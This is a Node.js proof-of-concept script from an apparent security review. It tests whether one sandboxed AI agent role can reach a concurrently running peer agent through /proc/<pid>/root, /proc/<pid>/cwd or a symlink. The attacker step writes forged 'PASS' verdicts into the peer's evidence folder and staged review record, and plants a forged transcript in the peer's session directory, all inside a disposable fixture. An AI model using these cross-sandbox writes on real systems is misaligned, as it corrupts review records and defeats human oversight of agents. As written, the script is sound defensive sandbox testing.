// DG0 round 18, code-security-reviewer: can one process-sandboxed agent write into ANOTHER concurrently running
// agent's rw areas through /proc/<peer-pid>/root (or /cwd), given the D-030 sandbox binds the host procfs and creates
// no PID namespace?  Uses the REAL tools/agents/agent_sandbox.py (prepare/args/finish) on a throwaway fixture repo,
// exactly as tools/agents/tests/process-sandbox.test.mjs does. Two sibling sandboxes:
//   victim   = qa-verifier            (sleeps, like a concurrently running reviewer)
//   attacker = code-security-reviewer (runs /bin/sh at the process-sandbox layer, i.e. with the same credentials the
//              agent's CLI file tools have: uid 0, CapEff = CAP_SETFCAP only, no_new_privs)
// Nothing outside the fixture under $TMPDIR is touched. No /proc/sys entry is written.
// Run: node r18-proc-peer-root-repro.mjs <path-to-candidate-clone>
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, cpSync, writeFileSync, rmSync } from "node:fs";
import { dirname, join } from "node:path";

process.env.GIT_CONFIG_GLOBAL = "/dev/null";
process.env.GIT_CONFIG_NOSYSTEM = "1";
process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = "repro";
process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = "repro@example.invalid";

const clone = process.argv[2];
const base = mkdtempSync(join(process.env.TMPDIR, "r18-peer-"));
const repo = join(base, "repo");
execFileSync("git", ["init", "-q", "-b", "main", repo]);
cpSync(join(clone, "tools", "agents"), join(repo, "tools", "agents"), { recursive: true, filter: (s) => !s.includes("__pycache__") });
for (const [rel, c] of Object.entries({ "CLAUDE.md": "rules\n", "tools/gates/t.mjs": "//\n",
  "docs/delivery/reviews/DG0/round-1/qa-verifier.json": "{\"verdict\":\"FAIL\"}\n", "docs/delivery/requirements.csv": "req_id\n" })) {
  mkdirSync(dirname(join(repo, rel)), { recursive: true }); writeFileSync(join(repo, rel), c);
}
for (const d of ["docs/delivery/gates", "tests/qa", "e2e", ...["domain", "code-security", "qa", "audit"].map((k) => `docs/delivery/test-evidence/DG0/${k}`)])
  mkdirSync(join(repo, d), { recursive: true });
execFileSync("git", ["-C", repo, "add", "-A"]); execFileSync("git", ["-C", repo, "commit", "-qm", "fixture"]);
const home = join(base, "home"); mkdirSync(join(home, ".claude"), { recursive: true });
const tmpParent = join(base, "var-tmp"); mkdirSync(tmpParent);
const env = { ...process.env, HOME: home };
const py = (...a) => execFileSync("python3", ["-I", "-B", join(repo, "tools/agents/agent_sandbox.py"), ...a], { env, cwd: "/" });

function prep(role) {
  const runTmp = mkdtempSync(join(tmpParent, "mth-run.")); const state = mkdtempSync(join(tmpParent, "mth-state."));
  py("prepare", role, repo, repo, "DG0", runTmp, state, process.execPath);
  const args = py("args", state).toString().split("\0").slice(0, -1);
  return { role, runTmp, state, args };
}
const victim = prep("qa-verifier");
const attacker = prep("code-security-reviewer");
const venv = { ...env, TMPDIR: victim.runTmp, MTH_RUN_TMP: victim.runTmp };

// Victim: record its pid (in its own private TMPDIR, readable from outside), create its round dir in staging, sleep.
const v = spawn("bwrap", [...victim.args, "/bin/sh", "-c",
  `mkdir -p ${repo}/docs/delivery/reviews/DG0/round-2; echo $$ > ${victim.runTmp}/pid; exec sleep 60`], { env: venv, cwd: "/", stdio: "ignore" });
for (let i = 0; i < 100 && !existsSync(join(victim.runTmp, "pid")); i++) spawnSync("sleep", ["0.1"]);
const vpid = readFileSync(join(victim.runTmp, "pid"), "utf8").trim();
console.log(`victim qa-verifier pid=${vpid}`);

const R = `/proc/${vpid}/root`;
const qaEv = `${repo}/docs/delivery/test-evidence/DG0/qa`;
const targets = {
  "A direct: other reviewer evidence (expected refused)": `${qaEv}/direct.txt`,
  "B via /proc/<peer>/root: other reviewer evidence": `${R}${qaEv}/via-proc-root.txt`,
  "C via /proc/<peer>/cwd: other reviewer evidence": `/proc/${vpid}/cwd/docs/delivery/test-evidence/DG0/qa/via-proc-cwd.txt`,
  "D via /proc/<peer>/root: other run private TMPDIR (disposable clone area)": `${R}${victim.runTmp}/planted-in-peer-clone.txt`,
  "E via /proc/<peer>/root: other reviewer STAGED review record": `${R}${repo}/docs/delivery/reviews/DG0/round-2/qa-verifier.json`,
  "F via /proc/<peer>/root: other run CLI session dir (transcripts)": `${R}${home}/.claude/projects/forged-transcript.jsonl`,
  "G via own-evidence symlink -> /proc/<peer>/root (file-tool race model)": `${repo}/docs/delivery/test-evidence/DG0/code-security/link`,
};
const script = [
  "echo \"attacker: $(grep -E '^(Uid|CapEff|CapBnd|NoNewPrivs)' /proc/self/status | tr '\\t\\n' '  ')\"",
  `ln -s ${R}${qaEv}/via-symlink.txt ${repo}/docs/delivery/test-evidence/DG0/code-security/link`,
  ...Object.entries(targets).map(([l, p]) => `if (echo '{"verdict":"PASS","forged_by":"code-security-reviewer"}' > '${p}') 2>/tmp/e; then echo '${l}: WROTE'; else echo "${l}: refused ($(cat /tmp/e | tail -c 80))"; fi`),
  `echo "read-only mode-bit probe (no write): test -w /proc/sys/kernel/core_pattern -> $(test -w /proc/sys/kernel/core_pattern && echo writable || echo not-writable)"`,
].join("\n");
const a = spawnSync("bwrap", [...attacker.args, "/bin/sh", "-c", script],
  { env: { ...env, TMPDIR: attacker.runTmp, MTH_RUN_TMP: attacker.runTmp }, encoding: "utf8", cwd: "/", timeout: 60000 });
console.log(a.stdout.trim()); if (a.stderr.trim()) console.log("attacker stderr:", a.stderr.trim());

v.kill("SIGKILL"); spawnSync("sleep", ["0.5"]);
// Real tree after the attack (outside every sandbox):
for (const f of ["direct.txt", "via-proc-root.txt", "via-proc-cwd.txt", "via-symlink.txt"])
  console.log(`real tree: test-evidence/DG0/qa/${f} exists=${existsSync(join(qaEv, f))}`);
console.log(`peer TMPDIR planted file exists=${existsSync(join(victim.runTmp, "planted-in-peer-clone.txt"))}`);
console.log(`peer session dir forged transcript exists=${existsSync(join(victim.state, "projects", "forged-transcript.jsonl"))}`);
// The victim's finish copies back its "own" staged files: does the attacker-authored record become the victim's?
const out = mkdtempSync(join(base, "out-"));
const f = spawnSync("python3", ["-I", "-B", join(repo, "tools/agents/agent_sandbox.py"), "finish", victim.state, out], { env, cwd: "/", encoding: "utf8" });
const sj = JSON.parse(readFileSync(join(out, "sandbox.json"), "utf8"));
console.log(`victim finish exit=${f.status} copied_back=${JSON.stringify(sj.copied_back)} discarded=${JSON.stringify(sj.discarded)}`);
const rec = join(repo, "docs/delivery/reviews/DG0/round-2/qa-verifier.json");
console.log(`real tree: reviews/DG0/round-2/qa-verifier.json = ${existsSync(rec) ? readFileSync(rec, "utf8").trim() : "(absent)"}`);
rmSync(base, { recursive: true, force: true });
console.log("fixture removed");
